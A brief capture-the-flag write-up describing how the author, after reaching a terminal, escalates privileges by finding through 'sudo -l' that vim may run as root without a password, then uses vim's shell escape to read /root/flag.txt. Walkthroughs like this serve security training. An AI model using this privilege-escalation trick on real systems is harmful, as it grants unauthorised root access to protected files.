After getting into the terminal

we found that the permission is denied for either getting into the /root directory and cat the flag.txt

then we use

> sudo -l 

to see if anything that we can do
found that we can run /usr/bin/vim without password

> sudo /usr/bin/vim
> :!cat /root/flag.txt

and we got the flag
